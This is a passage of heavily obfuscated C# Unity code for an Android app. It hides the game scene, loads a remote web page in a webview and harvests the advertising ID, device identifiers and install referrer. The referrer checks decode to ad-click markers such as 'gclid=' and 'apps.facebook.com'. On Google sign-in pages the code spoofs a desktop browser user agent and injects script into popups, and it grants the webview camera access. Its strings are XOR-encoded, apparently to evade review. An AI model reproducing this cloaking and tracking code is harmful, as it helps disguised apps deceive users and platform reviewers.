        _0xf040e05e(_0x7efe16e4);
        _0xbc54de4b(_0x7efe16e4);
        _0x7efe16e4.BackgroundColor = Color.clear;
        var _0x39acd203 = SceneManager.GetActiveScene().GetRootGameObjects();
        var _0x660868d0 = Camera.main;
        if (Camera.main != null)
        {
            Camera.main.cullingMask = 0;
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.black;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x2131d3ab();
        yield return new WaitForEndOfFrame();
        _0xf3277790 = true;
        _0xb5746a85();
        _0xfdb425d5(true);
        _0x4d3feca8 = false;
        _0x2cf098e9 = false;
        _0x16e4da3b.Clear();
        _0x9dc3f74c = -1;
        firstLoadShown = false;
        _0x696b1c49 = false;
        _0xd016fc7d = false;
        _0x7efe16e4.SetUserAgent("");
        _0x776f7518 = Time.realtimeSinceStartup;
        _0x7efe16e4.Stop();
        _0x7efe16e4.Load(_0x7452c413);
        _0x7efe16e4.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x691e60c5._0x0bb7411d(new byte[25] { 122, 86, 94, 89, 23, 96, 82, 85, 97, 94, 82, 64, 23, 126, 89, 94, 67, 94, 86, 91, 23, 100, 95, 88, 64 }, 55));
    }

    private void _0x0cda6327()
    {
        if (_0x7efe16e4 == null)
            return;
        if (_0x2cf098e9)
            _0x7efe16e4.SetUserAgent(_0x1a7c48d3());
        else
            _0x7efe16e4.SetUserAgent("");
    }

    // PART 3
    private string _0xd19e85ed()
    {
        try
        {
            var _0x51edc2ff = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[30] { 246, 250, 248, 187, 224, 251, 252, 225, 236, 166, 241, 187, 229, 249, 244, 236, 240, 231, 187, 192, 251, 252, 225, 236, 197, 249, 244, 236, 240, 231 }, 149));
            var _0x0c9be3d6 = _0x51edc2ff.GetStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 74, 92, 91, 91, 76, 71, 93, 104, 74, 93, 64, 95, 64, 93, 80 }, 41));
            var _0xf86e8892 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[57] { 15, 3, 1, 66, 11, 3, 3, 11, 0, 9, 66, 13, 2, 8, 30, 3, 5, 8, 66, 11, 1, 31, 66, 13, 8, 31, 66, 5, 8, 9, 2, 24, 5, 10, 5, 9, 30, 66, 45, 8, 26, 9, 30, 24, 5, 31, 5, 2, 11, 37, 8, 47, 0, 5, 9, 2, 24 }, 108));
            var _0x93c24c5e = _0xf86e8892.CallStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[20] { 230, 228, 245, 192, 229, 247, 228, 243, 245, 232, 242, 232, 239, 230, 200, 229, 200, 239, 231, 238 }, 129), _0x0c9be3d6);
            var _0x711e8dec = _0x93c24c5e.Call<string>(_0x691e60c5._0x0bb7411d(new byte[5] { 177, 179, 162, 159, 178 }, 214));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x711e8dec}");
#endif
            }

            return string.IsNullOrEmpty(_0x711e8dec) ? "" : _0x711e8dec;
        }
        catch
        {
            return "";
        }
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0x7efe16e4 = null;
    // WS_SOURCE MONO
    public static _0xf2129c2e _0x206625e7 { get; private set; }

    private Task _0xdde5cfbd(IEnumerator _0x8d275b6c)
    {
        var _0xa7953d85 = new TaskCompletionSource<bool>();
        StartCoroutine(_0xe7026741(_0x8d275b6c, _0xa7953d85));
        return _0xa7953d85.Task;
    }

    private void _0xbc54de4b(UniWebView _0xe5ddb0b4)
    {
        if (_0x83a700ad)
            return;
        _0x83a700ad = true;
        _0xe5ddb0b4.AddUrlScheme(_0x691e60c5._0x0bb7411d(new byte[2] { 162, 177 }, 214));
        _0xe5ddb0b4.AddUrlScheme(_0x691e60c5._0x0bb7411d(new byte[6] { 188, 187, 161, 176, 187, 161 }, 213));
        _0xe5ddb0b4.AddUrlScheme(_0x691e60c5._0x0bb7411d(new byte[6] { 96, 108, 127, 102, 104, 121 }, 13));
        _0xe5ddb0b4.OnMessageReceived += (_0x8bfacdd4, _0xf1132062) =>
        {
            if (TryOpenExternalLikeChrome(_0xf1132062.RawMessage))
            {
                _0xfdb425d5(false);
                return;
            }
        };
        _0xe5ddb0b4.RegisterShouldHandleRequest(_0xa0ba8ae0 =>
        {
            string _0x0de63afa = _0xa0ba8ae0 != null ? _0xa0ba8ae0.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x0de63afa))
                return true;
            WLog(_0x691e60c5._0x0bb7411d(new byte[21] { 75, 112, 119, 109, 116, 124, 80, 121, 118, 124, 116, 125, 74, 125, 105, 109, 125, 107, 108, 34, 56 }, 24) + _0x0de63afa);
            if (TryOpenExternalLikeChrome(_0x0de63afa))
            {
                _0xfdb425d5(false);
                return false;
            }

            if (_0xa0ba8ae0 != null && _0xa0ba8ae0.IsMainFrame && IsGoogleAuthFlowUrl(_0x0de63afa) && !_0x2cf098e9)
            {
                WLog(_0x691e60c5._0x0bb7411d(new byte[62] { 67, 111, 103, 96, 46, 89, 107, 108, 88, 103, 107, 121, 46, 106, 107, 122, 107, 109, 122, 107, 106, 46, 73, 97, 97, 105, 98, 107, 46, 111, 123, 122, 102, 46, 91, 92, 66, 46, 35, 48, 46, 124, 107, 98, 97, 111, 106, 46, 121, 103, 122, 102, 46, 73, 97, 97, 105, 98, 107, 46, 91, 79 }, 14));
                _0x2cf098e9 = true;
                _0xfdb425d5(true);
                _0x7efe16e4.SetUserAgent(_0x1a7c48d3());
                _0x7efe16e4.Load(_0x0de63afa);
                return false;
            }

            return true;
        });
        _0xe5ddb0b4.OnLoadingErrorReceived += (_0x8bfacdd4, _0x7db8f767, _0xf1132062, _0x8bf66b27) =>
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[25] { 14, 34, 42, 45, 99, 20, 38, 33, 21, 42, 38, 52, 99, 6, 49, 49, 44, 49, 121, 99, 32, 44, 39, 38, 126 }, 67) + _0x7db8f767 + _0x691e60c5._0x0bb7411d(new byte[9] { 100, 41, 33, 55, 55, 37, 35, 33, 121 }, 68) + _0xf1132062);
            string _0x95e5da67 = GetFailingUrl(_0x8bf66b27);
            if (string.IsNullOrEmpty(_0x95e5da67) || IsAboutBlank(_0x95e5da67))
                return;
            _ = _0xce9c1014(_0x691e60c5._0x0bb7411d(new byte[8] { 10, 11, 34, 24, 15, 15, 18, 15 }, 125));
            WLog(_0x691e60c5._0x0bb7411d(new byte[45] { 27, 55, 63, 56, 118, 1, 51, 52, 0, 63, 51, 33, 118, 48, 55, 63, 58, 63, 56, 49, 118, 3, 4, 26, 118, 123, 104, 118, 57, 38, 51, 56, 118, 51, 46, 34, 51, 36, 56, 55, 58, 58, 47, 108, 118 }, 86) + _0x95e5da67);
            StopCurrentFailedLoad(_0x8bfacdd4);
            _0x76f52684(_0x95e5da67);
        };
        _0xe5ddb0b4.OnPageStarted += (_0x8bfacdd4, _0x7937a2bf) =>
        {
            _0x27b4cf29 = 0;
            if (_0x4d3feca8 && IsAboutBlank(_0x7937a2bf))
            {
                WLog(_0x691e60c5._0x0bb7411d(new byte[27] { 43, 9, 30, 12, 26, 9, 22, 91, 26, 25, 20, 14, 15, 65, 25, 23, 26, 21, 16, 91, 8, 15, 26, 9, 15, 30, 31 }, 123));
                return;
            }

            WLog(_0x691e60c5._0x0bb7411d(new byte[29] { 127, 83, 91, 92, 18, 101, 87, 80, 100, 91, 87, 69, 18, 125, 92, 98, 83, 85, 87, 97, 70, 83, 64, 70, 87, 86, 8, 18, 25 }, 50) + (Time.realtimeSinceStartup - _0x776f7518).ToString(_0x691e60c5._0x0bb7411d(new byte[5] { 197, 219, 197, 197, 197 }, 245)) + _0x691e60c5._0x0bb7411d(new byte[2] { 227, 176 }, 144) + _0x7937a2bf);
            if (TryOpenExternalLikeChrome(_0x7937a2bf))
            {
                StopCurrentFailedLoad(_0x8bfacdd4);
                return;
            }

            if (ContainsIgnoreCase(_0x7937a2bf, _0x691e60c5._0x0bb7411d(new byte[8] { 81, 92, 92, 84, 27, 84, 69, 69 }, 53)) || ContainsIgnoreCase(_0x7937a2bf, _0x691e60c5._0x0bb7411d(new byte[15] { 209, 192, 216, 143, 214, 200, 197, 198, 196, 213, 143, 195, 205, 206, 198 }, 161)) || _0x7937a2bf.StartsWith(_0x691e60c5._0x0bb7411d(new byte[25] { 132, 152, 152, 156, 159, 214, 195, 195, 142, 156, 139, 128, 131, 142, 141, 128, 138, 141, 154, 194, 128, 133, 154, 137, 195 }, 236), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x8bfacdd4);
                OpenUrlExternally(_0x7937a2bf);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x7937a2bf))
            {
                _0xfdb425d5(true);
                WLog(_0x691e60c5._0x0bb7411d(new byte[41] { 160, 136, 136, 128, 139, 130, 199, 134, 146, 147, 143, 199, 129, 139, 136, 144, 199, 131, 130, 147, 130, 132, 147, 130, 131, 199, 202, 217, 199, 140, 130, 130, 151, 199, 145, 142, 148, 142, 133, 139, 130 }, 231));
                return;
            }

            _0x696b1c49 = true;
            _0xfdb425d5(true);
            WLog(_0x691e60c5._0x0bb7411d(new byte[43] { 8, 58, 61, 9, 54, 58, 40, 127, 51, 48, 62, 59, 54, 49, 56, 112, 45, 58, 59, 54, 45, 58, 60, 43, 54, 49, 56, 127, 114, 97, 127, 52, 58, 58, 47, 127, 41, 54, 44, 54, 61, 51, 58 }, 95));
        };
        _0xe5ddb0b4.OnPageCommitted += (_0x8bfacdd4, _0x7937a2bf) =>
        {
            if (_0x4d3feca8 && IsAboutBlank(_0x7937a2bf))
                return;
            WLog(_0x691e60c5._0x0bb7411d(new byte[31] { 73, 101, 109, 106, 36, 83, 97, 102, 82, 109, 97, 115, 36, 75, 106, 84, 101, 99, 97, 71, 107, 105, 105, 109, 112, 112, 97, 96, 62, 36, 47 }, 4) + (Time.realtimeSinceStartup - _0x776f7518).ToString(_0x691e60c5._0x0bb7411d(new byte[5] { 25, 7, 25, 25, 25 }, 41)) + _0x691e60c5._0x0bb7411d(new byte[2] { 149, 198 }, 230) + _0x7937a2bf);
            if (!firstLoadShown && IsHttpUrl(_0x7937a2bf))
            {
                firstLoadShown = true;
                _0x696b1c49 = false;
                _0xfdb425d5(false);
                _0x2131d3ab();
                _0x8bfacdd4.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xce9c1014(_0x691e60c5._0x0bb7411d(new byte[9] { 99, 98, 75, 123, 100, 113, 122, 113, 112 }, 20));
                WLog(_0x691e60c5._0x0bb7411d(new byte[39] { 141, 161, 169, 174, 224, 151, 165, 162, 150, 169, 165, 183, 224, 179, 168, 175, 183, 174, 224, 175, 174, 224, 163, 175, 173, 173, 169, 180, 180, 165, 164, 224, 163, 175, 174, 180, 165, 174, 180 }, 192));
            }
        };
        _0xe5ddb0b4.OnPageProgressChanged += (_0x8bfacdd4, _0xb05ed8ec) =>
        {
            if (_0x4d3feca8)
                return;
            if (!firstLoadShown && _0xb05ed8ec >= 0.65f)
            {
                firstLoadShown = true;
                _0x696b1c49 = false;
                _0xfdb425d5(false);
                _0x2131d3ab();
                _0x8bfacdd4.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xce9c1014(_0x691e60c5._0x0bb7411d(new byte[9] { 49, 48, 25, 41, 54, 35, 40, 35, 34 }, 70));
                WLog(_0x691e60c5._0x0bb7411d(new byte[32] { 118, 90, 82, 85, 27, 108, 94, 89, 109, 82, 94, 76, 27, 72, 83, 84, 76, 85, 27, 89, 66, 27, 75, 73, 84, 92, 73, 94, 72, 72, 1, 27 }, 59) + _0xb05ed8ec);
            }
        };
        _0xe5ddb0b4.OnPageFinished += (_0x8bfacdd4, _0x7db8f767, _0x7937a2bf) =>
        {
            if (_0x4d3feca8 && IsAboutBlank(_0x7937a2bf))
            {
                _0x4d3feca8 = false;
                WLog(_0x691e60c5._0x0bb7411d(new byte[28] { 226, 192, 215, 197, 211, 192, 223, 146, 211, 208, 221, 199, 198, 136, 208, 222, 211, 220, 217, 146, 212, 219, 220, 219, 193, 218, 215, 214 }, 178));
                return;
            }

            WLog(_0x691e60c5._0x0bb7411d(new byte[24] { 181, 153, 145, 150, 216, 175, 157, 154, 174, 145, 157, 143, 216, 190, 145, 150, 145, 139, 144, 157, 156, 194, 216, 211 }, 248) + (Time.realtimeSinceStartup - _0x776f7518).ToString(_0x691e60c5._0x0bb7411d(new byte[5] { 253, 227, 253, 253, 253 }, 205)) + _0x691e60c5._0x0bb7411d(new byte[7] { 141, 222, 157, 145, 154, 155, 195 }, 254) + _0x7db8f767 + _0x691e60c5._0x0bb7411d(new byte[5] { 108, 57, 62, 32, 113 }, 76) + _0x7937a2bf);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x696b1c49 = false;
                _0xfdb425d5(false);
                _0x2131d3ab();
                _0x8bfacdd4.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xce9c1014(_0x691e60c5._0x0bb7411d(new byte[9] { 13, 12, 37, 21, 10, 31, 20, 31, 30 }, 122));
                WLog(_0x691e60c5._0x0bb7411d(new byte[33] { 167, 139, 131, 132, 202, 189, 143, 136, 188, 131, 143, 157, 202, 140, 131, 152, 153, 158, 202, 134, 133, 139, 142, 202, 137, 133, 135, 154, 134, 143, 158, 143, 142 }, 234));
            }
            else if (_0x696b1c49)
            {
                _0x696b1c49 = false;
                _0xfdb425d5(false);
                _0x8bfacdd4.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x691e60c5._0x0bb7411d(new byte[40] { 212, 248, 240, 247, 185, 206, 252, 251, 207, 240, 252, 238, 185, 202, 241, 246, 238, 185, 248, 255, 237, 252, 235, 185, 245, 246, 248, 253, 240, 247, 254, 185, 255, 240, 247, 240, 234, 241, 252, 253 }, 153));
            }
            else
            {
                _0xfdb425d5(false);
            }

            if (_0x2cf098e9 && !IsGoogleAuthFlowUrl(_0x7937a2bf) && !IsGoogleAuthFlowUrl(_0x7937a2bf))
            {
                WLog(_0x691e60c5._0x0bb7411d(new byte[48] { 68, 108, 108, 100, 111, 102, 35, 98, 118, 119, 107, 35, 112, 102, 102, 110, 112, 35, 101, 106, 109, 106, 112, 107, 102, 103, 35, 46, 61, 35, 113, 102, 112, 119, 108, 113, 102, 35, 103, 102, 101, 98, 118, 111, 119, 35, 86, 66 }, 3));
                _0x2cf098e9 = false;
                _0x7efe16e4.SetUserAgent("");
            }
        };
        _0xe5ddb0b4.OnShouldClose += _0x8bfacdd4 =>
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[41] { 184, 183, 134, 144, 151, 190, 195, 174, 130, 138, 141, 195, 180, 134, 129, 181, 138, 134, 148, 195, 172, 141, 176, 139, 140, 150, 143, 135, 160, 143, 140, 144, 134, 195, 138, 141, 149, 140, 136, 134, 135 }, 227));
            _0x078ddcbc();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0xe5ddb0b4.SetPopupPageEventEnabled(true);
        bool _0x4dc7503f = false;
        bool _0x60776367 = false;
        _0xe5ddb0b4.OnMultipleWindowOpened += (_0x8bfacdd4, _0x2eafd87f) =>
        {
            _0x8bfacdd4.ScrollTo(0, 0, false);
            WLog(_0x691e60c5._0x0bb7411d(new byte[43] { 220, 211, 226, 244, 243, 218, 167, 202, 230, 238, 233, 167, 208, 226, 229, 209, 238, 226, 240, 167, 202, 242, 235, 243, 238, 247, 235, 226, 208, 238, 233, 227, 232, 240, 167, 200, 247, 226, 233, 226, 227, 189, 167 }, 135) + _0x2eafd87f);
            var _0x9a400d2b = _0xe5ddb0b4.GetPopupWindow(_0x2eafd87f);
            if (_0x9a400d2b == null)
                return;
            _0x16e4da3b.Add(_0x9a400d2b);
            Debug.Log($"[Test] Popup ID: {_0x9a400d2b.Id}");
            _0x9a400d2b.OnPageStarted += (_0x1aba88c0, _0x7937a2bf) =>
            {
                WLog(_0x691e60c5._0x0bb7411d(new byte[36] { 112, 127, 78, 88, 95, 118, 11, 123, 68, 91, 94, 91, 11, 124, 78, 73, 125, 66, 78, 92, 11, 100, 69, 123, 74, 76, 78, 120, 95, 74, 89, 95, 78, 79, 17, 11 }, 43) + _0x7937a2bf);
                _0x27b4cf29 = 0;
                if (string.IsNullOrEmpty(_0x7937a2bf) || IsAboutBlank(_0x7937a2bf))
                    return;
                if (IsGoogleAuthFlowUrl(_0x7937a2bf))
                {
                    WLog(_0x691e60c5._0x0bb7411d(new byte[57] { 36, 43, 26, 12, 11, 34, 95, 47, 16, 15, 10, 15, 95, 56, 16, 16, 24, 19, 26, 95, 30, 10, 11, 23, 95, 25, 19, 16, 8, 95, 82, 65, 95, 12, 15, 16, 16, 25, 95, 56, 16, 16, 24, 19, 26, 95, 60, 23, 13, 16, 18, 26, 95, 42, 62, 69, 95 }, 127) + _0x7937a2bf);
                    _0x4dc7503f = false;
                    _0x5a758606();
                    if (_0x1aba88c0 != null && _0x1aba88c0.IsAlive)
                        _0x1aba88c0.EvaluateJavaScript(_0x3321e03e());
                    return;
                }

                if (_0x7efe16e4 == null)
                    return;
                if (!_0x4dc7503f)
                {
                    _0x4dc7503f = true;
                    _0x7efe16e4.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x691e60c5._0x0bb7411d(new byte[39] { 12, 3, 50, 36, 35, 10, 119, 7, 56, 39, 34, 39, 119, 54, 39, 39, 59, 46, 119, 0, 62, 57, 51, 56, 32, 36, 119, 51, 50, 36, 60, 35, 56, 39, 119, 2, 22, 109, 119 }, 87) + _0x7937a2bf);
                }

                if (_0x1aba88c0 != null && _0x1aba88c0.IsAlive)
                    _0x1aba88c0.EvaluateJavaScript(_0x08999488());
                if (!_0x60776367 && _0x1aba88c0 != null && _0x1aba88c0.IsAlive && IsHttpUrl(_0x7937a2bf))
                {
                    _0x60776367 = true;
                }
            };
            _0x9a400d2b.OnPageFinished += (_0x1aba88c0, _0x8bf66b27) =>
            {
                string _0xfdb44e22 = _0x8bf66b27 != null ? _0x8bf66b27.data : string.Empty;
                WLog(_0x691e60c5._0x0bb7411d(new byte[35] { 59, 52, 5, 19, 20, 61, 64, 48, 15, 16, 21, 16, 64, 55, 5, 2, 54, 9, 5, 23, 64, 38, 9, 14, 9, 19, 8, 5, 4, 90, 64, 21, 18, 12, 93 }, 96) + _0xfdb44e22);
                if (_0x1aba88c0 == null || !_0x1aba88c0.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0xfdb44e22))
                {
                    _0x5a758606();
                    _0x1aba88c0.EvaluateJavaScript(_0x3321e03e());
                    return;
                }

                if (!_0x4dc7503f)
                    return;
                _0x1aba88c0.EvaluateJavaScript(_0x08999488());
            };
        };
        _0xe5ddb0b4.OnMultipleWindowClosed += (_0x8bfacdd4, _0x2eafd87f) =>
        {
            _0x16e4da3b.RemoveAll(_0xfd4e6016 => _0xfd4e6016 == null || _0xfd4e6016.Id == _0x2eafd87f || !_0xfd4e6016.IsAlive);
            _0xfdb425d5(false);
            if (_0x16e4da3b.Count == 0 && _0x7efe16e4 != null)
            {
                _0x4dc7503f = false;
                _0x60776367 = false;
                _0x0cda6327();
            }

            WLog(_0x691e60c5._0x0bb7411d(new byte[43] { 179, 188, 141, 155, 156, 181, 200, 165, 137, 129, 134, 200, 191, 141, 138, 190, 129, 141, 159, 200, 165, 157, 132, 156, 129, 152, 132, 141, 191, 129, 134, 140, 135, 159, 200, 171, 132, 135, 155, 141, 140, 210, 200 }, 232) + _0x2eafd87f);
        };
        _0xe5ddb0b4.RegisterOnRequestMediaCapturePermission(_0xa0ba8ae0 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private IEnumerator _0x4a8107ff()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[26] { 89, 86, 103, 113, 118, 95, 34, 75, 108, 107, 118, 107, 99, 110, 107, 120, 103, 80, 103, 100, 100, 103, 112, 103, 112, 34 }, 2));
            }
#endif
        }

        bool _0xb00a08f2 = false;
        InstallReferrer.GetReferrer((_0x1e8e0f6a) =>
        {
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[24] { 160, 175, 158, 136, 143, 219, 169, 158, 157, 158, 137, 137, 158, 137, 166, 219, 156, 158, 143, 219, 25, 125, 105, 219 }, 251) + _0xadc80036);
            if (_0x1e8e0f6a.IsSuccess)
            {
                _0xadc80036 = _0x1e8e0f6a.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[28] { 46, 33, 16, 6, 1, 85, 39, 16, 19, 16, 7, 7, 16, 7, 40, 85, 38, 0, 22, 22, 16, 6, 6, 85, 151, 243, 231, 85 }, 117) + _0xadc80036);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[27] { 64, 79, 126, 104, 111, 59, 73, 126, 125, 126, 105, 105, 126, 105, 70, 59, 93, 122, 114, 119, 126, 127, 59, 249, 157, 137, 59 }, 27) + _0x1e8e0f6a);
#endif
                }

                _0xadc80036 = "";
            }

            _0x63f42519 = true;
        });
        StartCoroutine(_0x421f57ba(2f));
        yield return new WaitUntil(() => _0x63f42519);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xadc80036}");
#endif
        }

        bool _0xe52fc035 = _0xadc80036.Contains(_0x691e60c5._0x0bb7411d(new byte[6] { 73, 77, 66, 71, 74, 19 }, 46));
        _0xb00a08f2 = _0xe52fc035 || _0xadc80036.Contains(_0x691e60c5._0x0bb7411d(new byte[18] { 222, 207, 207, 204, 145, 214, 209, 204, 203, 222, 216, 205, 222, 210, 145, 220, 208, 210 }, 191)) || _0xadc80036.Contains(_0x691e60c5._0x0bb7411d(new byte[17] { 150, 135, 135, 132, 217, 145, 150, 148, 146, 149, 152, 152, 156, 217, 148, 152, 154 }, 247));
        _0x1f1a6c98 = _0xe52fc035 ? "" : (_0xb00a08f2 ? "" : _0x1f1a6c98);
        _0x1f1a6c98 = _0x1f1a6c98 ?? "";
        _0xd2bbde7e = _0xd2bbde7e ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x1f1a6c98}");
#endif
        }
    }

    private string _0x1f1a6c98 { get; set; }

    private async Task<bool> _0xb73ba882()
    {
        _0xb0d18c71.Instance.AnimSliderSequence.Pause();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x8002b434) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[32] { 245, 250, 203, 221, 218, 243, 142, 251, 192, 199, 218, 215, 142, 254, 219, 221, 198, 142, 224, 193, 218, 199, 200, 199, 205, 207, 218, 199, 193, 192, 148, 142 }, 174) + string.Join(_0x691e60c5._0x0bb7411d(new byte[1] { 67 }, 74), _0x8002b434));
                }
#endif
            }
        };
        try
        {
            _0xf074aa2c = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[31] { 246, 249, 200, 222, 217, 240, 141, 235, 204, 196, 193, 200, 201, 141, 217, 194, 141, 202, 200, 217, 141, 221, 216, 222, 197, 141, 217, 194, 198, 200, 195 }, 173));
                }
#endif
            }

            _0xf074aa2c = "";
        }

        _0x019a6445 = !string.IsNullOrEmpty(_0xf074aa2c);
        _0x92a3cc73 = _0x8c1b9694();
        {
#if B_LOGS
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[25] { 147, 156, 173, 187, 188, 149, 232, 157, 166, 161, 188, 177, 232, 152, 189, 187, 160, 232, 156, 167, 163, 173, 166, 242, 232 }, 200) + _0xf074aa2c);
#endif
        }

        _0xb0d18c71.Instance.AnimSliderSequence.Play();
        return false;
    }

    private IEnumerator _0x421f57ba(float _0x012f932b)
    {
        yield return new WaitForSeconds(_0x012f932b);
        if (!_0x63f42519)
        {
            _0x63f42519 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xadc80036}");
                }
#endif
            }
        }
    }

    internal string _0xef0a8a6c(string _0x1c25107f)
    {
        int _0x590382cb = _0x1c25107f.IndexOf(_0x691e60c5._0x0bb7411d(new byte[3] { 0, 13, 84 }, 105), StringComparison.OrdinalIgnoreCase);
        if (_0x590382cb < 0)
            return null;
        string _0x2c25bf0d = _0x1c25107f.Substring(_0x590382cb + 3);
        int _0x46ccd568 = _0x2c25bf0d.IndexOf('&');
        return _0x46ccd568 >= 0 ? _0x2c25bf0d.Substring(0, _0x46ccd568) : _0x2c25bf0d;
    }

    private string _0x5d479634()
    {
        try
        {
            using (var _0xee899af7 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[30] { 59, 55, 53, 118, 45, 54, 49, 44, 33, 107, 60, 118, 40, 52, 57, 33, 61, 42, 118, 13, 54, 49, 44, 33, 8, 52, 57, 33, 61, 42 }, 88)))
            {
                var _0x24d3f64d = _0xee899af7.GetStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 140, 154, 157, 157, 138, 129, 155, 174, 140, 155, 134, 153, 134, 155, 150 }, 239));
                var _0x16d5ca7a = _0x24d3f64d.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[21] { 164, 166, 183, 130, 179, 179, 175, 170, 160, 162, 183, 170, 172, 173, 128, 172, 173, 183, 166, 187, 183 }, 195));
                using (var _0x5324eb3c = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[26] { 116, 123, 113, 103, 122, 124, 113, 59, 98, 112, 119, 126, 124, 97, 59, 66, 112, 119, 70, 112, 97, 97, 124, 123, 114, 102 }, 21)))
                {
                    return _0x5324eb3c.CallStatic<string>(_0x691e60c5._0x0bb7411d(new byte[19] { 161, 163, 178, 130, 163, 160, 167, 179, 170, 178, 147, 181, 163, 180, 135, 161, 163, 168, 178 }, 198), _0x16d5ca7a);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private static readonly string WindowsDesktopUserAgent = _0x691e60c5._0x0bb7411d(new byte[111] { 145, 179, 166, 181, 176, 176, 189, 243, 233, 242, 236, 252, 244, 139, 181, 178, 184, 179, 171, 175, 252, 146, 136, 252, 237, 236, 242, 236, 231, 252, 139, 181, 178, 234, 232, 231, 252, 164, 234, 232, 245, 252, 157, 172, 172, 176, 185, 139, 185, 190, 151, 181, 168, 243, 233, 239, 235, 242, 239, 234, 252, 244, 151, 148, 136, 145, 144, 240, 252, 176, 181, 183, 185, 252, 155, 185, 191, 183, 179, 245, 252, 159, 180, 174, 179, 177, 185, 243, 237, 238, 236, 242, 236, 242, 236, 242, 236, 252, 143, 189, 186, 189, 174, 181, 243, 233, 239, 235, 242, 239, 234 }, 220);
    private async void Start()
    {
        await _0xc5d58db7();
    }

    private RectTransform _0x87ec74b0;
    private string _0x04655db9 = "";
    private float _0x776f7518 = 0f;
    private string _0xdac302cf;
    private int _0xb0745b2e = 5, _0x2df47042 = 5, _0xc737cb2e = 5, _0x484bed6e = 5;
    private GameObject _0x3b47e84a;
    internal bool isApplicationPause = false;
    internal bool IsAboutBlank(string _0xb13fda19)
    {
        if (string.IsNullOrEmpty(_0xb13fda19))
            return false;
        return _0xb13fda19.StartsWith(_0x691e60c5._0x0bb7411d(new byte[11] { 59, 56, 53, 47, 46, 96, 56, 54, 59, 52, 49 }, 90), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0x2cf098e9 = false;
    private Canvas _0x128eb3c4()
    {
        if (_0x22cfc713 != null)
            return _0x22cfc713;
        var _0xcc091eb5 = gameObject.GetComponentInChildren<Canvas>();
        if (_0xcc091eb5 == null)
        {
            var _0xc40a4467 = new GameObject(_0x691e60c5._0x0bb7411d(new byte[6] { 9, 43, 36, 60, 43, 57 }, 74), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0xcc091eb5 = _0xc40a4467.GetComponent<Canvas>();
            _0xcc091eb5.transform.SetParent(transform, false);
            _0xcc091eb5.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x22cfc713 = _0xcc091eb5;
        return _0x22cfc713;
    }

    private string _0x7d8400f7 = "";
    private void _0x22802cae()
    {
        {
#if B_LOGS
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[22] { 45, 34, 19, 5, 2, 43, 86, 37, 2, 25, 4, 19, 50, 19, 0, 31, 21, 19, 63, 24, 16, 25 }, 118));
#endif
        }

        _0x87bad85f = SystemInfo.deviceModel;
        _0x32882548 = Application.version;
        _0x6a2fc7a7 = Application.installMode;
        _0x4a19c911 = Application.installerName;
        _0xd51077f3 = Application.identifier;
        _0x70078989 = _0xd19e85ed();
        _0x634c61b5 = _0x5d479634();
        _0x04655db9 = SystemInfo.deviceUniqueIdentifier;
        _0x15439407 = SystemInfo.graphicsDeviceName;
        _0xc7b61809 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x32882548 = _0x691e60c5._0x0bb7411d(new byte[5] { 74, 83, 74, 83, 74 }, 125);
                _0x6a2fc7a7 = ApplicationInstallMode.Store;
                _0x4a19c911 = _0x691e60c5._0x0bb7411d(new byte[19] { 105, 101, 103, 36, 107, 100, 110, 120, 101, 99, 110, 36, 124, 111, 100, 110, 99, 100, 109 }, 10);
                _0x634c61b5 = _0x691e60c5._0x0bb7411d(new byte[8] { 100, 108, 113, 117, 120, 33, 116, 96 }, 1);
